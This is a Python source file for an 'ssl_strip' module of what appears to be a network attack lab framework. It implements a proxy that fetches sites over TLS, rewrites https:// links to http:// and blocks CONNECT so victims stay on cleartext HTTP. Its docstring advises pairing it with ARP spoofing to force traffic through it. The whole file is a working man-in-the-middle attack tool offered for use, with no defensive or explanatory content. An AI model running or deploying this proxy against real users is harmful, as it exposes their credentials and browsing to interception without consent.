"""Lab SSL stripping HTTP proxy.

Clients that send plain HTTP through this proxy get https:// links rewritten to
http://. Pair it with ARP spoofing and force the victim to use the proxy
(or a transparent redirect on the lab gateway). TLS itself is not broken;
the client is kept on cleartext HTTP.
"""

from __future__ import annotations

import select
import socket
import ssl
import time
from typing import Any

from netlab.base import BaseModule, ModuleParam


def _read_headers(conn: socket.socket) -> bytes:
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
        if len(data) > 65536:
            break
    return data


def _rewrite(payload: bytes) -> bytes:
    return payload.replace(b"https://", b"http://").replace(b"HTTPS://", b"HTTP://")


class SslStrip(BaseModule):
    name = "ssl_strip"
    description = "HTTP proxy that rewrites https:// links to http:// (needs MITM path)"
    category = "app"

    @classmethod
    def parameters(cls) -> list[ModuleParam]:
        return [
            ModuleParam(
                name="listen_port",
                type="int",
                label="Proxy listen port",
                required=False,
                default=8080,
            ),
            ModuleParam(
                name="duration",
                type="int",
                label="Duration (seconds)",
                required=False,
                default=60,
                description="0 = until Stop",
            ),
        ]

    def run(self, params: dict[str, Any], logger: Any, rate_limiter: Any) -> None:
        port = int(params.get("listen_port", 8080))
        duration = int(params.get("duration", 60))
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", port))
        server.listen(32)
        server.setblocking(False)
        start = time.time()
        print(f"[ssl_strip] proxy on 0.0.0.0:{port}")
        print("  Victim HTTP must be directed here (proxy setting or lab redirect).")

        try:
            while not self.should_stop():
                if duration > 0 and (time.time() - start) >= duration:
                    break
                readable, _, _ = select.select([server], [], [], 0.5)
                if not readable:
                    continue
                try:
                    client, addr = server.accept()
                except OSError:
                    continue
                print(f"  client {addr[0]}:{addr[1]}")
                try:
                    self._handle_client(client, logger)
                except Exception as exc:  # noqa: BLE001
                    print(f"  client error: {exc}")
                finally:
                    client.close()
        except KeyboardInterrupt:
            print("\n[ssl_strip] Interrupted")
        finally:
            server.close()
        print("[ssl_strip] Done")

    def _handle_client(self, client: socket.socket, logger: Any) -> None:
        client.settimeout(8)
        raw = _read_headers(client)
        if not raw:
            return
        head, _, rest = raw.partition(b"\r\n\r\n")
        lines = head.decode("iso-8859-1", errors="replace").split("\r\n")
        if not lines or " " not in lines[0]:
            return
        method, path, *_ = lines[0].split(" ")
        if method.upper() == "CONNECT":
            client.sendall(b"HTTP/1.1 405 Method Not Allowed\r\nConnection: close\r\n\r\n")
            print("  refused CONNECT (client tried to keep TLS)")
            return

        host = None
        port = 443
        for line in lines[1:]:
            if line.lower().startswith("host:"):
                host = line.split(":", 1)[1].strip()
        if path.startswith("http://"):
            without = path[len("http://") :]
            hostport, _, path = without.partition("/")
            path = "/" + path
            if ":" in hostport:
                host, port_s = hostport.rsplit(":", 1)
                port = int(port_s)
            else:
                host = hostport
                port = 80
        if not host:
            return

        # Prefer the TLS site when the client still spoke cleartext HTTP.
        upstream_port = 443 if port in (80, 443) else port
        use_tls = upstream_port == 443
        request_lines = [f"{method} {path} HTTP/1.0"]
        for line in lines[1:]:
            lower = line.lower()
            if lower.startswith("proxy-connection"):
                continue
            request_lines.append(line)
        request = ("\r\n".join(request_lines) + "\r\n\r\n").encode("iso-8859-1") + rest

        remote: socket.socket
        sock = socket.create_connection((host, upstream_port), timeout=8)
        if use_tls:
            ctx = ssl.create_default_context()
            remote = ctx.wrap_socket(sock, server_hostname=host)
        else:
            remote = sock
        try:
            remote.sendall(request)
            response = b""
            while True:
                chunk = remote.recv(8192)
                if not chunk:
                    break
                response += chunk
                if len(response) > 1_000_000:
                    break
        finally:
            remote.close()

        rewritten = _rewrite(response)
        client.sendall(rewritten)
        logger.add_packets(1, len(rewritten))
        changed = rewritten != response
        print(f"  {method} {host}{path}  rewritten={changed}  {len(rewritten)} bytes")
